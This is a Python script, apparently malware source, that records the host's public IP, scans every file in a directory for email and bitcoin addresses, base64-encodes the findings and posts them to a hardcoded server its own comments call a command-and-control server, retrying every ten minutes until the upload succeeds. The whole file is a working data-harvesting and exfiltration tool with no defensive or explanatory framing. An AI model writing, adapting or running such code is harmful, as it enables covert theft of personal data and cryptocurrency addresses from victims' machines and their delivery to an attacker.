import socket
import requests
import os
import re
import json
import base64
import time

def open_socket(host: str, port: int, timeout: int = 5) -> socket.socket:
    """ Opens a TCP/IP socket and connects to the server. """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        return sock
    except socket.error as e:
        raise socket.error(f"Socket connection failed: {str(e)}")

def get_public_ip(api_key: str):
    """ Retrieves the public IP of the machine using IPAPI. """
    try:
        url = f"http://api.ipapi.com/api/check?access_key={api_key}"
        response = requests.get(url)
        data = response.json()
        if response.status_code == 200 and "ip" in data:
            return data["ip"]
        else:
            return "Unable to retrieve IP address"
    except Exception as e:
        return f"Error: {e}"

def scan_files_for_addresses(directory: str):
    """ Scans files in the given directory for email and bitcoin addresses. """
    email_pattern = r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+'
    bitcoin_pattern = r'\b(1|3)[a-km-zA-HJ-NP-Z1-9]{25,34}\b'
    found_emails = []
    found_bitcoins = []

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    found_emails.extend(re.findall(email_pattern, content))
                    found_bitcoins.extend(re.findall(bitcoin_pattern, content))
            except Exception as e:
                print(f"Could not read {file_path}: {e}")

    # Format the data into JSON
    data = {
        'emails': found_emails,
        'bitcoin_addresses': found_bitcoins
    }

    # Convert to JSON and then base64 encode
    json_data = json.dumps(data, indent=4)
    encoded_json = base64.b64encode(json_data.encode('utf-8')).decode('utf-8')

    return encoded_json

def send_data_to_server(data: str, server_url: str):
    """ Sends the data to the C&C server via a POST request. """
    try:
        json_data = json.dumps({"data": data})  # Wrap data in a dictionary
        response = requests.post(server_url, data=json_data, headers={"Content-Type": "application/json"})
        if response.status_code == 200:
            print("Data successfully sent to the server.")
        else:
            print(f"Failed to send data. Server responded with: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

def check_server_online(server_url: str):
    """ Checks if the server is online by sending a HEAD request. """
    try:
        response = requests.head(server_url, timeout=10)
        if response.status_code == 200:
            print("Server is online.")
            return True
        else:
            print(f"Server returned status code {response.status_code}.")
            return False
    except requests.RequestException as e:
        print(f"Server is offline or unreachable. Error: {e}")
        return False

def main():
    # Hardcode the C&C URL and API Key
    api_key = "YOUR_ACCESS_KEY"  # Replace with your actual IPAPI key
    server_url = "http://example.com/receive_data"  # URL of the C&C server
    directory_to_scan = "C:/path/to/scan"  # Directory you want to scan for emails/bitcoin addresses

    # Get public IP
    print("************ Getting Public IP ************")
    public_ip = get_public_ip(api_key)
    print("Public IP Address:", public_ip)

    # Scan files for emails and bitcoin addresses
    print("************ Scanning files for email/bitcoin addresses ************")
    encoded_data = scan_files_for_addresses(directory_to_scan)

    # Check if the server is online and send data
    print("************ Checking if the server is online ************")
    while True:
        if check_server_online(server_url):
            print("Server is online, sending data...")
            send_data_to_server(encoded_data, server_url)
            break  # Once sent, exit the loop
        else:
            print("Server is offline, retrying in 10 minutes...")
            time.sleep(600)  # Wait for 10 minutes before retrying

# Run the main function
if __name__ == "__main__":
    main()
